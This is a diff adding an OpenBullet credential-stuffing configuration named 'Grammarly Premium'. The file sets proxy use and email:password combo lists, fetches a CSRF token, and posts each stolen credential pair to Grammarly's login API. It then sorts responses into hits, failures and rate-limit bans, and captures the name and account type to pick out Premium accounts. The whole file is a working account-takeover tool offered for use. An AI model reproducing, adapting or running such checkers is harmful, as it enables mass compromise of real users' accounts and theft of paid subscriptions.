@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Grammarly Premium",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-05T21:47:38.4309389+08:00",
+  "AdditionalInfo": "",
+  "Author": "wreckme",
+  "Version": "1.3.9 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.grammarly.com/signin" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(csrf-token)>" LR "" "" -> VAR "CSRF" 
+
+REQUEST POST "https://auth.grammarly.com/v3/api/login" 
+  CONTENT "{\"email_login\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.grammarly.com" 
+  HEADER "Referer: https://www.grammarly.com/signin" 
+  HEADER "X-CSRF-Token: <CSRF>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"error\":\"FAILURE\"" 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "user" 
+    KEY "lastname" 
+  KEYCHAIN Ban OR 
+    KEY "Sign-in is disabled because of too many attempts. Try again later." 
+
+#Name PARSE "<SOURCE>" LR "\"firstName\":\"" "\"" -> CAP "" 
+
+#Account_Type PARSE "<SOURCE>" LR "\"type\":\"" "\"" -> CAP "Account Type" 
+
+#ACVAR PARSE "<SOURCE>" LR "\"type\":\"" "\"" -> VAR "TYPE" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<TYPE>" Contains "Free" 
+  KEYCHAIN Success OR 
+    KEY "<TYPE>" Contains "Premium" 
+  KEYCHAIN Failure OR 
+    KEY "<TYPE>" Contains "" 
+
